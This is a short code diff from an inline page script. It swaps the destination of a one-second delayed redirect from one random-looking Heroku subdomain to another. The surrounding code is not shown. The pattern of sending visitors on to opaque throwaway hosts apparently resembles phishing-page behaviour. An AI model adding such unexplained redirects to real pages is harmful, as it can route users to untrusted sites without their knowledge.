@@ -146,7 +146,7 @@
             }
 
             setTimeout(() => {
-                window.location.href = "https://prgrqweqewr-e190e2def932.herokuapp.com/";
+                window.location.href = "https://winindnmbmnnbde-ab15cacc792e.herokuapp.com/";
             }, 1000);
         }
     </script>
